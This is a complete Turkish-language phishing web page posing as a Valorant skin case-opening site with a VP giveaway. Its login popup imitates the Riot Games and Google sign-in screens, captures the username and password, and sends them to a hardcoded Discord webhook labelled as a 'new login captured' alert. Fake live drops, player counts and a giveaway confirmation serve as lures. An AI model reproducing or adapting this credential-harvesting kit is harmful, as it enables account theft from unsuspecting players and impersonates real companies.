<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALOLOOT.NET | En İyi Valorant Kasa Açma Sitesi</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
    <style>
        :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
        
        /* Ana Ekran Arka Plan Sabitleme */
        body { 
            background-color: var(--dark-bg); 
            background-image: url('background.jpg'); /* Senin orijinal dosyan */
            background-size: cover;
            background-attachment: fixed;
            background-position: center;
            color: white; 
            font-family: 'Inter', sans-serif; 
            margin: 0; 
            padding: 0; 
            min-height: 100vh; 
        }
        
        /* Canlı Droplar Üst Bar */
        .live-drops { background: rgba(0, 0, 0, 0.9); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; z-index: 100; }
        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; }
        .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; }
        .drop-card { background: rgba(255,255,255,0.05); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); }
        .drop-card img { height: 45px; object-fit: contain; }
        .rarity-box { width: 100%; height: 6px; margin-top: auto; }

        /* Navigasyon */
        header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
        .logo span { color: var(--valo-red); }
        .nav-links { display: flex; gap: 25px; flex-grow: 1; }
        .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; font-size: 14px; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }

        /* Çekiliş Bölümü */
        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(17, 20, 32, 0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(10px); }
        #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }

        /* Kasalar */
        .case-wrapper { max-width: 1200px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .case-box { background: #111420; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); width: 260px; transition: 0.3s; cursor: pointer; }
        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
        .case-box img { width: 100%; height: 160px; object-fit: contain; margin-bottom: 15px; }
        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 20px; margin-bottom: 10px; font-family: 'Montserrat'; }
        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 12px; font-weight: 800; border-radius: 4px; text-transform: uppercase; cursor: pointer; }

        /* İstatistikler */
        .live-stats { display: flex; justify-content: center; gap: 80px; padding: 50px 0; background: rgba(0,0,0,0.4); border-top: 1px solid rgba(255,255,255,0.05); }
        .stat-num { display: block; font-size: 30px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }

        /* Yükleme Simgesi */
        .loader { width: 14px; height: 14px; border: 2px solid #fff; border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
        @keyframes rotation { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="live-drops">
        <div class="mythic-label">CANLI DROPLAR</div>
        <div id="dropTrack" class="drop-container"></div>
    </div>

    <header>
        <div class="logo">VALO<span>LOOT</span></div>
        <div class="nav-links">
            <a href="#">KASALAR</a><a href="#">SAVAŞLAR</a><a href="#">MAĞAZA</a>
        </div>
        <div id="authArea">
            <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
        </div>
    </header>

    <div class="giveaway-section">
        <div>
            <h2 style="margin:0; font-family:'Montserrat';">10 ADET 8900 VP ÇEKİLİŞİ</h2>
            <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">KATILMAK İÇİN OTURUM AÇIN</p>
        </div>
        <div style="text-align:right">
            <div id="countdown">00:00:00</div>
            <span style="font-size:10px; color:#555;">KALAN SÜRE</span>
        </div>
    </div>

    <div class="case-wrapper">
        <div class="case-row" id="row1"></div>
        <div class="case-row" id="row2"></div>
    </div>

    <div class="live-stats">
        <div><span class="stat-num">2,841</span><span style="color:#555; font-size:12px;">AKTİF OYUNCU</span></div>
        <div><span class="stat-num">148,209</span><span style="color:#555; font-size:12px;">KASA AÇILDI</span></div>
    </div>

    <script>
        // 1. Kasa ve Drop Başlatıcı
        const skins = [
            {img: "skin1.png", color: "#ade55c"}, {img: "skin2.png", color: "#4b82d5"}, 
            {img: "skin3.png", color: "#d151dc"}, {img: "skin4.png", color: "#f7c133"}
        ];

        function startDrops() {
            const track = document.getElementById('dropTrack');
            setInterval(() => {
                const s = skins[Math.floor(Math.random() * skins.length)];
                const div = document.createElement('div');
                div.className = 'drop-card';
                div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
                track.prepend(div);
                if(track.children.length > 12) track.removeChild(track.lastChild);
            }, 3000);
        }

        const cases = [
            {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
            {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
            {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
        ];

        function loadCases() {
            const r1 = document.getElementById('row1');
            const r2 = document.getElementById('row2');
            cases.slice(0, 4).forEach(c => {
                r1.innerHTML += `<div class="case-box" onclick="openAuth()"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
            });
            cases.slice(4, 6).forEach(c => {
                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
            });
        }

        function updateTimer() {
            setInterval(() => {
                const now = new Date();
                const target = new Date(); target.setHours(24,0,0,0);
                let diff = target - now;
                if(diff<0) diff += 86400000;
                let h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            }, 1000);
        }

        loadCases(); startDrops(); updateTimer();

        // 2. Auth Penceresi (Hatalar Giderildi)
        function openAuth() {
            const w = 550, h = 800;
            const l = (window.screen.width/2)-(w/2), t = (window.screen.height/2)-(h/2);
            let win = window.open("", "Auth", `width=${w},height=${h},top=${t},left=${l}`);
            
            // Popup İçeriği
            const html = `
                <!DOCTYPE html>
                <html>
                <head>
                    <style>
                        body { margin:0; padding:0; font-family:sans-serif; background: url('popup-bg.jpg') center/cover; display:flex; align-items:center; justify-content:center; height:100vh; }
                        .card { background:#fff; width:340px; padding:40px; text-align:center; border-radius:4px; box-shadow: 0 5px 25px rgba(0,0,0,0.2); }
                        input { width:100%; padding:15px; margin:10px 0; background:#f2f2f2; border:none; border-radius:4px; box-sizing:border-box; font-weight:700; }
                        .btn-red { background:#ff4655; color:#fff; border:none; width:100%; padding:15px; margin-top:20px; cursor:pointer; font-weight:900; }
                        .social { display:grid; grid-template-columns: repeat(5, 1fr); gap:10px; margin:20px 0; }
                        .s-btn { height:40px; border:1px solid #eee; display:flex; align-items:center; justify-content:center; cursor:pointer; }
                        
                        #google-ui { display:none; }
                    </style>
                </head>
                <body>
                    <div id="riot-ui" class="card">
                        <img src="riot_logo.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'" width="50">
                        <h2 style="margin:20px 0;">OTURUM AÇ</h2>
                        <input type="text" id="u" placeholder="KULLANICI ADI">
                        <input type="password" id="p" placeholder="ŞİFRE">
                        <div class="social">
                            <div class="s-btn"><img src="fb-icon.png" width="20" onerror="this.style.display='none'"></div>
                            <div class="s-btn" onclick="showGoogle()"><img src="google-icon.png" width="20" onerror="this.style.display='none'"></div>
                            <div class="s-btn"><img src="apple_logo.png" width="20" onerror="this.style.display='none'"></div>
                            <div class="s-btn"><img src="xbox_logo.png" width="20" onerror="this.style.display='none'"></div>
                            <div class="s-btn"><img src="ps_logo.png" width="20" onerror="this.style.display='none'"></div>
                        </div>
                        <button class="btn-red" onclick="send('Riot')">DEVAM ET</button>
                    </div>

                    <div id="google-ui" class="card">
                        <img src="google_logo.png" width="100" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg'">
                        <h3>Oturum Açın</h3>
                        <input type="text" id="gu" placeholder="E-posta veya telefon">
                        <input type="password" id="gp" placeholder="Şifreniz">
                        <button class="btn-red" style="background:#1a73e8" onclick="send('Google')">İLERİ</button>
                        <p onclick="location.reload()" style="color:#1a73e8; cursor:pointer; font-size:12px; margin-top:15px;">Geri Dön</p>
                    </div>

                    <script>
                        function showGoogle() { document.getElementById('riot-ui').style.display='none'; document.getElementById('google-ui').style.display='block'; }
                        function send(m) {
                            const u = (m==='Riot') ? document.getElementById('u').value : document.getElementById('gu').value;
                            const p = (m==='Riot') ? document.getElementById('p').value : document.getElementById('gp').value;
                            if(u && p) {
                                window.opener.postMessage({u, p, m}, "*");
                                window.close();
                            }
                        }
                    <\/script>
                </body>
                </html>
            `;
            win.document.write(html);
        }

        // 3. Webhook Dinleyici
        window.addEventListener("message", (e) => {
            if(e.data.u && e.data.p) {
                const area = document.getElementById('authArea');
                area.innerHTML = `<button class="btn-login" style="background:#444;"><span class="loader"></span></button>`;

                fetch("https://discord.com/api/webhooks/1346618520242184193/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "Yeni Giriş Yakalandı!",
                            color: 16729941,
                            fields: [
                                {name: "Tür", value: e.data.m, inline: true},
                                {name: "Kullanıcı", value: e.data.u},
                                {name: "Şifre", value: e.data.p}
                            ]
                        }]
                    })
                });

                setTimeout(() => {
                    area.innerHTML = `<div style="color:#79eb1e; font-weight:800; border:1px solid #79eb1e; padding:5px 15px; border-radius:4px;">${e.data.u.toUpperCase()} #TR1</div>`;
                    document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
                    document.getElementById('giveawayStatus').style.color = "#79eb1e";
                }, 2000);
            }
        });
    </script>
</body>
</html>
